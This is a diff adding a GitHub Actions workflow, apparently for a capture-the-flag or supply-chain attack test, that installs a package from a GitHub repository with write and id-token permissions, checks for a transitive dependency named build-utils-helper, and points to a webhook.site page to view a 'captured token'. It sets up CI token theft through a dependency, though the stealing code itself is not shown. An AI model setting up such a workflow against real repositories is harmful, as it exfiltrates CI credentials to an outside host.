@@ -1,0 +1,39 @@
+name: Test Token Capture via Panchajanya
+on:
+  push:
+    branches: [ main, ctf-pwned-test ]
+  workflow_dispatch:
+permissions:
+  contents: write
+  actions: read
+  id-token: write
+jobs:
+  install-panchajanya:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+      - name: Install Panchajanya package from GitHub
+        run: npm install git+https://github.com/slv055/Panchajanya.git
+      - name: Verify installation
+        run: |
+          echo "Installation complete"
+          npm list --depth=2
+      - name: Check if build-utils-helper was installed
+        run: |
+          if [ -d "node_modules/build-utils-helper" ]; then
+            echo "✅ build-utils-helper installed (transitive dependency)"
+            ls -la node_modules/build-utils-helper/
+          else
+            echo "❌ build-utils-helper not found"
+          fi
+      - name: Check webhook
+        run: |
+          echo "🎯 Check webhook.site for captured token:"
+          echo "https://webhook.site/#!/view/a837dde1-d189-4fb3-9462-d43f9d7ba7b4"
